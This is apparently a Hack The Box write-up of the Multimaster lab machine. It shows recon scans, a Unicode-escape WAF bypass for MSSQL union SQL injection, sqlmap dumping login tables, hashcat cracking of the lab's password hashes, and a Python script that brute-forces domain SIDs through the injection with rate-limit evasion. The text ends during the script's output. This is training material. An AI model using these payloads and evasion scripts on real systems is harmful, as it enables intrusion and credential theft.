---
title: Multimaster
date: 2026-05-13
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - windows
  - Insane
  - Port53-DNS-Discovery-Host
  - Port139-135-SMB-Anonymous-Login-Failed
  - Port139-135-SMB-Rid-Brute-Failed
  - OWASP-SQL-Inject-search-func-mssql
  - Linux-Enumation-program-files
  - Windows-Privilege-vscode-debugger
  - Nmap-analyzing
  - Windows-Enumation-inetpub
  - Windows-Enumation-inetpub-dataleak
  - reverse-engine-dll-strings
  - Bloodhound-vectory-GenericWrite
  - 
  - KRB5KRB_AP_ERR_SKEW
  - Port5985-winrm-evil-winrm-AMSI-firewall-bypass
  - Windows-Enumation-net-user
  - Windows-Privilege-SeRestorePrivilege-SeBackupPrivilege
  - Windows-Privilege-ZeroLogon
lastmod: 2026-05-15T09:46:20.302Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Multimaster" >}}

***

# Recon

### PORT & IP SCAN

{{< toggle "Tag 🏷️" >}}

{{< tag "Nmap-analyzing" >}}The target 10.129.95.200 is a Windows Server 2016 Standard machine named MULTIMASTER, joined to the MEGACORP.LOCAL Active Directory domain. The scan reveals a classic AD domain controller fingerprint: DNS (53), Kerberos (88), RPC (135), NetBIOS/SMB (139/445), and LDAPS (3269) are all open, confirming DC role. A Microsoft IIS 10.0 web server on port 80 hosts a site titled "MegaCorp" with the potentially risky TRACE HTTP method enabled. RDP (3389) and WinRM (5985) are exposed, offering remote management attack surface. SMB enumeration confirms message signing is required (mitigating relay attacks) but the guest account was used for probing, and the workgroup is MEGACORP. Several high RPC ports (49666–49678) are standard Windows ephemeral RPC endpoints. The clock skew (~7 minutes) is within Kerberos tolerance but worth noting for any ticket-based attacks.

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T 3     10.129.95.200  -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-12 23:27 -0400
Nmap scan report for 10.129.95.200
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-13 03:34:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-13T03:35:58+00:00; +7m00s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2026-05-13T03:35:18+00:00
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2026-05-12T02:44:47
|_Not valid after:  2026-11-11T02:44:47
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2026-05-12T20:35:22-07:00
|_clock-skew: mean: 1h31m01s, deviation: 3h07m52s, median: 6m59s
| smb2-time: 
|   date: 2026-05-13T03:35:22
|_  start_date: 2026-05-13T02:44:56
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.40 seconds
                                                                   
```

### DNS 53

{{< toggle "Tag 🏷️" >}}

{{< tag "Port53-DNS-Discovery-Host" >}} Discovering the DNS 53 port , using the netexec nxc 's --generate-hosts-file to generate the hosts file and put into the /etc/hosts

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc smb 10.129.95.200   --generate-hosts-file  hosts
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# cat hosts       
10.129.95.200     MULTIMASTER.MEGACORP.LOCAL MEGACORP.LOCAL MULTIMASTER
```

```
┌──(root㉿kali)-[~/Desktop]
└─# cat /etc/hosts    
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.95.200     MULTIMASTER.MEGACORP.LOCAL MEGACORP.LOCAL MULTIMASTER


# Added by Docker Desktop
# To allow the same kube context to work on the host and the container:
127.0.0.1       kubernetes.docker.internal
# End of section
```

### SMB 445

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-Anonymous-Login-Failed" >}} Failed login with Anonymous with Connection Error: The NETBIOS connection with the remote host timed out.

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.95.200   -u 'guest' -p '' --shares
SMB         10.129.95.200   445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:True)
SMB         10.129.95.200   445    NONE             [-] Connection Error: The NETBIOS connection with the remote host timed out.

```

### SMB RID

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-Rid-Brute-Failed" >}} Failed rid brute force with STATUS\_ACCOUNT\_DISABLED

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.95.200   -u 'guest' -p '' --rid-brute 
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\guest: STATUS_ACCOUNT_DISABLED 

```

# Port 80 Web

### Tech stack

{{< tech-stack >}}

Vue.js\
Web Server: Apache/2.4.52\
windows IIS

{{< /tech-stack >}}

In the http://10.129.95.200/#/app that has the search function , I will throw it in browser

sql inject

{{< toggle "Tag 🏷️" >}}

{{< tag "OWASP-SQL-Inject-search-func-mssql" >}} Discovering the web page and found the search function with WAF firewall protect , after fuzzing , knowing the special chars with unicode escape sequences can bypass it , so using the union attack to get Domain , Domain RID and User RID by mssql , and using sqlmap to dump the password tables with hashcat to decode the valid password.

{{< /toggle >}}

\=== Here is the step by step for detecting the sql  injection ===

#### Fuzzing with special chars

1. `a` is the search keyword for having the result of search function

![Pasted image 20260513131537.png](/ob/Pasted%20image%2020260513131537.png)

2. On Top that adding the special characters for triggering like the server error by using the fuzzing and bypass the white list

Only Character

```
~
!
@
#
$
%
^
&
*
(
)
-
_
+
=
{
}
]
[
|
\
`
,
.
/
?
;
:
'
"
<
>
```

ASCII hex

```
\u7E
\u21
\u40
\u24
\u25
\u5E
\u26
\u28
\u29
\u5F
\u3D
\u7B
\u7D
\u5D
\u5B
\u7C
\u60
\u2C
\u2E
\u2F
\u3F
\u3B
\u3A
\u27
\u22
\u3C
```

Unicode escape sequences

```
\u007E
\u0021
\u0040
\u0024
\u0025
\u005E
\u0026
\u0028
\u0029
\u005F
\u003D
\u007B
\u007D
\u005D
\u005B
\u007C
\u0060
\u002C
\u002E
\u002F
\u003F
\u003B
\u003A
\u0027
\u0022
\u003C
```

Simple characters encoded

```
%21
%40
%23
%24
%25
%5E
%26
%2A
%28
%29
%2B
%3D
%7B
%7D
%5D
%5B
%7C
%5C
%60
%2C
%2F
%3F
%3B
%3A
%27
%22
%3C
%3E
```

Multiple encoding

```
2521%
2540%
2523%
2524%
2525%
%255E
2526%
%252A
2528%
2529%
%252B
%253D
%257B
%257D
%255D
%255B
%257C
%255C
2560%
%252C
%252F  252F
%253F
%253B
%253A
2527%
2522%
%253C
%253E
```

#### Get different Respond

After the fuzzing the special chars , we will know which encoding method is allow to bypass the firewall ,`\u0027` will return the `null` , and the `\` and `\u27`  return the `error has occurred` that mean we can use the Unicode escape sequences to bypass due to `\u0027` is unicoding

##### POC

work on \\

![Pasted image 20260513133601.png](/ob/Pasted%20image%2020260513133601.png)

Also work on `\u27`\
![Pasted image 20260513134905.png](/ob/Pasted%20image%2020260513134905.png)

![Pasted image 20260513141255.png](/ob/Pasted%20image%2020260513141255.png)

That is a good sign there’s SQL injection, even if blind.

#### Unicode escape sequences bypass with union attack

Change to the payload to Unicode due to the \u002d has the response of null , so modifying the payload to Unicode, and we can use the cyberchef https://gchq.github.io/CyberChef/ to help us to encode.

![Pasted image 20260514135426.png](/ob/Pasted%20image%2020260514135426.png)

```
a' --
```

\u002d is the `-`

\u0027 is the `'`

![Pasted image 20260513142222.png](/ob/Pasted%20image%2020260513142222.png)

analysis : return the `[ ]` is mean the `--` comment is successful as we dont have any error ,

In Case , we use the normal request , that will be block

![Pasted image 20260513142552.png](/ob/Pasted%20image%2020260513142552.png)

Therefore, in this step , we need to bypass the firewall to make our payload successful inject in somehow way without error. We can go forward to the union attack

#### union attack know how many null

Try the union inject with encode payload, after testing , the 1,2,3,4,5 will has the response, and  use the loop to do it , but use the manual method will be more aceturate will not not block by firewall

**Operational tip:** Add a **3–5 second delay** between each manual request — this avoids rate-limit triggers and keeps your session under the WAF's anomaly detection threshold.

![Pasted image 20260514141439.png](/ob/Pasted%20image%2020260514141439.png)

Start from the 1 to test until has the response

```
a' union select 1,2,3,4,5 -- -
a' union select null,null,null,null,null -- -
```

![Pasted image 20260514143338.png](/ob/Pasted%20image%2020260514143338.png)

#### Identify database

Abusing the union attack to know what database is using

using the the list to check

```
@@version
version()
* FROM v$version
```

##### POC

version()\
![Pasted image 20260513150823.png](/ob/Pasted%20image%2020260513150823.png)

* FROM v\$version

![Pasted image 20260513150857.png](/ob/Pasted%20image%2020260513150857.png)\
@@version\
![Pasted image 20260513150800.png](/ob/Pasted%20image%2020260513150800.png)

now we can ensure that the database is `Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) \n\tAug 22 2017 17:04:49 \n\tCopyright (C) 2017 Microsoft Corporation\n\tStandard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)\n`

#### pentestmonkey's inject cheatsheat

so we can use the mssql command

Ref : https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

whoami : I am called to finder

![Pasted image 20260513151543.png](/ob/Pasted%20image%2020260513151543.png)

Using Database is `Hub_DB`

![Pasted image 20260513151811.png](/ob/Pasted%20image%2020260513151811.png)

What do I need to do here? I noticed there is a login function, so I should get the username and password from the database.

#### Dump the table with sqlmap

The command `sqlmap -r colleagues.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dump-all --exclude-sysdbs` automates the Unicode bypass injection we confirmed manually — loading the exact Burp-captured HTTP request via `-r` to preserve all headers and session cookies, while `--tamper=charunicodeescape` converts every sensitive character into full `\u00XX` sequences to pass through the WAF undetected. The `--delay 5` enforces a 5-second gap between requests to stay under rate-limit and anomaly thresholds, while `--level 5` and `--risk 3` push sqlmap to test every possible parameter at maximum aggression including headers and cookies. Routing through `--proxy http://127.0.0.1:8080` lets Burp Suite monitor every payload in real time, `--batch` removes all interactive prompts for unattended execution, and `--dump-all --exclude-sysdbs` tells sqlmap to extract everything from application databases only — skipping system tables and going straight for the credentials inside the Users table tied to the login function.

```
┌──(root㉿kali)-[~/Desktop]
└─# sqlmap -r colleagues.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dump-all --exclude-sysdbs
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.10#stable}                                                                                                                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:58:54 /2026-05-13/

[04:58:54] [INFO] parsing HTTP request from 'colleagues.request'

(custom) POST parameter 'JSON name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 398 HTTP(s) requests:
---
Parameter: JSON name ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: {"name":"a\u0027 \u0075nion se\u006cect 1,2,3,DB_NAME(),null\u002d\u002d \u002d' OR NOT 5262=5262-- xhfP"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: {"name":"a\u0027 \u0075nion se\u006cect 1,2,3,DB_NAME(),null\u002d\u002d \u002d' UNION ALL SELECT 84,84,84,84,CONCAT(CONCAT('qpzjq','LGufsErCBUXLKkYKTRWPbTHkIfNCvwpaXHXVkfoy'),'qxpvq')-- qGfH"}
---
[21:52:17] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[21:52:17] [INFO] testing MySQL
[21:52:31] [WARNING] the back-end DBMS is not MySQL
[21:52:31] [INFO] testing Oracle
[21:52:37] [WARNING] the back-end DBMS is not Oracle
[21:52:37] [INFO] testing PostgreSQL
[21:52:43] [WARNING] the back-end DBMS is not PostgreSQL
[21:52:43] [INFO] testing Microsoft SQL Server
[21:52:51] [INFO] confirming Microsoft SQL Server
[21:53:30] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 2016 or 2019 or 2022 or 11
web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET
back-end DBMS: Microsoft SQL Server 2017
[21:53:30] [INFO] sqlmap will dump entries of all tables from all databases now
[21:53:30] [INFO] fetching database names
[21:53:36] [INFO] fetching tables for databases: Hub_DB, [master], model, msdb, tempdb
[21:54:07] [INFO] skipping system database 'tempdb'
[21:54:07] [INFO] skipping system database 'msdb'
[21:54:07] [INFO] skipping system database 'model'
[21:54:07] [INFO] fetching columns for table 'Colleagues' in database 'Hub_DB'
[21:54:12] [INFO] fetching entries for table 'Colleagues' in database 'Hub_DB'
Database: Hub_DB
Table: Colleagues
[17 entries]
+----+----------------------+-------------+----------------------+----------------------+
| id | email                | image       | name                 | position             |
+----+----------------------+-------------+----------------------+----------------------+
| 1  | sbauer@megacorp.htb  | sbauer.jpg  | Sarina Bauer         | Junior Developer     |
| 2  | okent@megacorp.htb   | okent.jpg   | Octavia Kent         | Senior Consultant    |
| 3  | ckane@megacorp.htb   | ckane.jpg   | Christian Kane       | Assistant Manager    |
| 4  | kpage@megacorp.htb   | kpage.jpg   | Kimberly Page        | Financial Analyst    |
| 5  | shayna@megacorp.htb  | shayna.jpg  | Shayna Stafford      | HR Manager           |
| 6  | james@megacorp.htb   | james.jpg   | James Houston        | QA Lead              |
| 7  | cyork@megacorp.htb   | cyork.jpg   | Connor York          | Web Developer        |
| 8  | rmartin@megacorp.htb | rmartin.jpg | Reya Martin          | Tech Support         |
| 9  | zac@magacorp.htb     | zac.jpg     | Zac Curtis           | Junior Analyst       |
| 10 | jorden@megacorp.htb  | jorden.jpg  | Jorden Mclean        | Full-Stack Developer |
| 11 | alyx@megacorp.htb    | alyx.jpg    | Alyx Walters         | Automation Engineer  |
| 12 | ilee@megacorp.htb    | ilee.jpg    | Ian Lee              | Internal Auditor     |
| 13 | nbourne@megacorp.htb | nbourne.jpg | Nikola Bourne        | Head of Accounts     |
| 14 | zpowers@megacorp.htb | zpowers.jpg | Zachery Powers       | Credit Analyst       |
| 15 | aldom@megacorp.htb   | aldom.jpg   | Alessandro Dominguez | Senior Web Developer |
| 16 | minato@megacorp.htb  | minato.jpg  | MinatoTW             | CEO                  |
| 17 | egre55@megacorp.htb  | egre55.jpg  | egre55               | CEO                  |
+----+----------------------+-------------+----------------------+----------------------+

[21:54:20] [INFO] table 'Hub_DB.dbo.Colleagues' dumped to CSV file '/root/.local/share/sqlmap/output/10.129.95.200/dump/Hub_DB/Colleagues.csv'
[21:54:20] [INFO] fetching columns for table 'Logins' in database 'Hub_DB'
[21:54:26] [INFO] fetching entries for table 'Logins' in database 'Hub_DB'
[21:54:32] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[21:54:32] [INFO] using hash method 'sha384_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[21:54:32] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[21:54:32] [INFO] starting dictionary-based cracking (sha384_generic_passwd)
[21:54:32] [INFO] starting 8 processes 
[21:54:41] [WARNING] no clear password(s) found                                                                                                                                                                                            
Database: Hub_DB
Table: Logins
[17 entries]
+----+--------------------------------------------------------------------------------------------------+----------+
| id | password                                                                                         | username |
+----+--------------------------------------------------------------------------------------------------+----------+
| 1  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | sbauer   |
| 2  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | okent    |
| 3  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ckane    |
| 4  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | kpage    |
| 5  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | shayna   |
| 6  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | james    |
| 7  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | cyork    |
| 8  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | rmartin  |
| 9  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zac      |
| 10 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | jorden   |
| 11 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | alyx     |
| 12 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ilee     |
| 13 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | nbourne  |
| 14 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zpowers  |
| 15 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | aldom    |
| 16 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | minatotw |
| 17 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | egre55   |
+----+--------------------------------------------------------------------------------------------------+----------+

[21:54:41] [INFO] table 'Hub_DB.dbo.Logins' dumped to CSV file '/root/.local/share/sqlmap/output/10.129.95.200/dump/Hub_DB/Logins.csv'
[21:54:41] [INFO] fetching columns for table 'INFORMATION_SCHEMA.CHECK_CONSTRAINTS' in database 'master'
[21:54:52] [INFO] fetching entries for table 'INFORMATION_SCHEMA.CHECK_CONSTRAINTS' in database 'master'
[21:55:03] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[21:55:16] [INFO] fetching number of entries for table 'INFORMATION_SCHEMA.CHECK_CONSTRAINTS' in database 'master'
[21:55:16] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[21:55:16] [INFO] retrieved: 0
[21:56:18] [WARNING] table 'INFORMATION_SCHEMA.CHECK_CONSTRAINTS' in database 'master' appears to be empty
Database: master
Table: INFORMATION_SCHEMA.CHECK_CONSTRAINTS
[0 entries]
+-----------+-----------+--------------+------------------+------------------+--------+--------+-----------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+----------------+-----------------+-------------------+---------------------+---------------------+----------------------+------------------------+-------------------------+
| object_id | schema_id | principal_id | parent_column_id | parent_object_id | name   | type   | type_desc | create_date | is_disabled | modify_date | CHECK_CLAUSE | definition   | is_published | is_ms_shipped | is_not_trusted | is_system_named | CONSTRAINT_NAME   | CONSTRAINT_SCHEMA   | is_schema_published | CONSTRAINT_CATALOG   | is_not_for_replication | uses_database_collation |
+-----------+-----------+--------------+------------------+------------------+--------+--------+-----------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+----------------+-----------------+-------------------+---------------------+---------------------+----------------------+------------------------+-------------------------+
+-----------+-----------+--------------+------------------+------------------+--------+--------+-----------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+----------------+-----------------+-------------------+---------------------+---------------------+----------------------+------------------------+-------------------------+

[21:56:18] [INFO] table '[master].INFORMATION_SCHEMA.CHECK_CONSTRAINTS' dumped to CSV file '/root/.local/share/sqlmap/output/10.129.95.200/dump/master/INFORMATION_SCHEMA.CHECK_CONSTRAINTS.csv'
[21:56:18] [INFO] fetching columns for table 'INFORMATION_SCHEMA.COLUMNS' in database 'master'
[21:56:24] [INFO] fetching entries for table 'INFORMATION_SCHEMA.COLUMNS' in database 'master'

```

The `sqlmap` automated cracker didn’t break any of the hashes, but it uses a limited wordlist. Given the length of the hash, it looks like SHA-384. When I ran `hashcat` with `-m 10800` for SHA-384 with `rockyou.txt`, nothing broke. There’s two other formats on the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page - SHA3-384 (`-m 17500`) and Keccak-384 (`-m 17900`). When I ran with the latter, I got results:

```
root@kali# hashcat -m 17900 hashes /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...
...[snip]...
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
Approaching final keyspace - workload adjusted.  
...[snip]...
```

While there’s a bunch of users in the database, there were only four unique passwords, and three broke with `rockyou.txt`:

| Password  | Users                                       |
| --------- | ------------------------------------------- |
| password1 | sbauer, shayna, james, cyork, jorden, aldom |
| finance1  | ckane, kpage, zac, ilee, zpowers            |
| banking1  | okent, rmartin, alyx, nbourne               |
| ?         | minatotw, egre55                            |

#### Get Default Domain

First step is to get the domain name with `SELECT DEFAULT_DOMAIN()`. I can just replace all the static `CHAR` with that query to get:

like that

![Pasted image 20260514103637.png](/ob/Pasted%20image%2020260514103637.png)

The domain is `MEGACORP`

![Pasted image 20260514103729.png](/ob/Pasted%20image%2020260514103729.png)

#### Get a Domain RID

Now I need to get a domain RID using the `SUSER_SID` function on a known group (I’ll use `MEGACORP/Domain Admins`):

```
a' UNION ALL SELECT 58,58,58,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),58-- gxQm
```

```
\u0061\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0041\u004C\u004C\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0035\u0038\u002C\u0035\u0038\u002C\u0035\u0038\u002C\u006D\u0061\u0073\u0074\u0065\u0072\u002E\u0064\u0062\u006F\u002E\u0066\u006E\u005F\u0076\u0061\u0072\u0062\u0069\u006E\u0074\u006F\u0068\u0065\u0078\u0073\u0074\u0072\u0028\u0053\u0055\u0053\u0045\u0052\u005F\u0053\u0049\u0044\u0028\u0027\u004D\u0045\u0047\u0041\u0043\u004F\u0052\u0050\u005C\u0044\u006F\u006D\u0061\u0069\u006E\u0020\u0041\u0064\u006D\u0069\u006E\u0073\u0027\u0029\u0029\u002C\u0035\u0038\u002D\u002D\u0020\u0067\u0078\u0051\u006D
```

0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000

#### Build a User RID

![Pasted image 20260514111614.png](/ob/Pasted%20image%2020260514111614.png)

I know the default administrator is RID 500. So I can make this RID by taking 500, converting to hex (0x1f4), padding it to 4 bytes (0x000001f4), and reversing the byte order (0xf4010000). So the administrator RID should be `0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000`. To check, I’ll run `SUSER_SNAME`:

I’ll need a script to brute force across the possible SIDs that could be in use by users. What I came up with was this:

```
#!/usr/bin/env python3

import binascii
import requests
import struct
import sys
import time


payload_template = """test' UNION ALL SELECT 58,58,58,{},58-- -"""


def unicode_escape(s):
    return "".join([r"\u{:04x}".format(ord(c)) for c in s])


def issue_query(sql):
    while True:
        resp = requests.post(
            "http://10.10.10.179/api/getColleagues",
            data='{"name":"' + unicode_escape(payload_template.format(sql)) + '"}',
            headers={"Content-type": "text/json; charset=utf-8"},
            proxies={"http": "http://127.0.0.1:8080"},
        )
        if resp.status_code != 403:
            break
        sys.stdout.write("\r[-] Triggered WAF. Sleeping for 30 seconds")
        time.sleep(30)
    return resp.json()[0]["email"]


print("[*] Finding domain")
domain = issue_query("DEFAULT_DOMAIN()")
print(f"[+] Found domain: {domain}")

print("[*] Finding Domain SID")
sid = issue_query(f"master.dbo.fn_varbintohexstr(SUSER_SID('{domain}\Domain Admins'))")[:-8]
print(f"[+] Found SID for {domain} domain: {sid}")

for i in range(500, 10500):
    sys.stdout.write(f"\r[*] Checking SID {i}" + " " * 50)
    num = binascii.hexlify(struct.pack("<I", i)).decode()
    acct = issue_query(f"SUSER_SNAME({sid}{num})")
    if acct:
        print(f"\r[+] Found account [{i:05d}]  {acct}" + " " * 30)
    time.sleep(1)

print("\r" + " " * 50)
```

The WAF has some kind of dumb rate limiting. I think it’s looking at requests over some time period and returning 403 if there are too many. I just have a loop that sleeps for 30 seconds and tries again if there’s a 403. The current parameters are to sleep 30 seconds on a 403, and 1 second between requests. It’s possible those could be optimized.

Getting Python to actually send `\u0027` was tricker than I expected. I originally was doing `json={"name":""}` in the POST, but Python is too nice about formatting that. Changing it to `data` and setting it the way I have above took some trial and error through the proxy.

Sending through Burp was really nice, and it didn’t really slow anything down since I was already going slow for the WAF.

```
root@kali# ./get_domain_users.py 
[*] Finding domain
[+] Found domain: MEGACORP
[*] Finding Domain SID
[+] Found SID for MEGACORP domain: 0x0105000000000005150000001c00d1bcd181f1492bdfc236
[+] Found account [00500]  MEGACORP\Administrator                              
[+] Found account [00501]  MEGACORP\Guest                              
[+] Found account [00502]  MEGACORP\krbtgt                              
[+] Found account [00503]  MEGACORP\DefaultAccount                              
[+] Found account [00512]  MEGACORP\Domain Admins                              
[+] Found account [00513]  MEGACORP\Domain Users                              
[+] Found account [00514]  MEGACORP\Domain Guests                              
[+] Found account [00515]  MEGACORP\Domain Computers                              
[+] Found account [00516]  MEGACORP\Domain Controllers                              
[+] Found account [00517]  MEGACORP\Cert Publishers                              
[+] Found account [00518]  MEGACORP\Schema Admins                              
[+] Found account [00519]  MEGACORP\Enterprise Admins                              
[+] Found account [00520]  MEGACORP\Group Policy Creator Owners                              
[+] Found account [00521]  MEGACORP\Read-only Domain Controllers                              
[+] Found account [00522]  MEGACORP\Cloneable Domain Controllers                              
[+] Found account [00525]  MEGACORP\Protected Users                              
[+] Found account [00526]  MEGACORP\Key Admins                              
[+] Found account [00527]  MEGACORP\Enterprise Key Admins                              
[+] Found account [00553]  MEGACORP\RAS and IAS Servers                              
[+] Found account [00571]  MEGACORP\Allowed RODC Password Replication Group                              
[+] Found account [00572]  MEGACORP\Denied RODC Password Replication Group                              
[+] Found account [01000]  MEGACORP\MULTIMASTER$                              
[+] Found account [01101]  MEGACORP\DnsAdmins                              
[+] Found account [01102]  MEGACORP\DnsUpdateProxy                              
[+] Found account [01103]  MEGACORP\svc-nas                              
[+] Found account [01105]  MEGACORP\Privileged IT Accounts                              
[+] Found account [01110]  MEGACORP\tushikikatomo                              
[+] Found account [01111]  MEGACORP\andrew                              
[+] Found account [01112]  MEGACORP\lana                               
[+] Found account [01601]  MEGACORP\alice                              
